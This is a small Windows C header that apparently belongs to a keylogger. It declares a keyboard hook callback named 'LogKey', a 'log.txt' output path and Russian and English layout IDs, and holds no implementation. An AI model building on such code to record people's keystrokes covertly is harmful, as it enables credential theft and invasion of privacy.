#pragma once
#define _CRT_SECURE_NO_WARNINGS
#include<Windows.h>
#include<stdio.h>


#define PATH L"log.txt"
#define RUS 1049
#define ENG 1033
#define SIZE_STR 30

LRESULT CALLBACK LogKey(int nCode, WPARAM wParam, LPARAM lParam);